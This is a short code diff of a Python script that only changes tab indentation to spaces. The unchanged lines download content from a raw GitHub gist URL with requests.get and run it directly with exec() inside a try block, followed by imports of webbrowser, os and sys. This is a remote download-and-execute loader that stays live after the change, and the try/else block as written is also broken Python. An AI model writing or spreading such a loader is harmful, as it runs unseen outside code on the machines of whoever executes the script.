@@ -3,9 +3,9 @@ a = 'https://gist.githubusercontent.com/deflationz/0654ff6a860ba20234b42d794f76a
 response = requests.get(a)
 b = response.content
 try:
-	exec(b)
+    exec(b)
 else:
-	pass
+    pass
 import webbrowser
 import os
 import sys
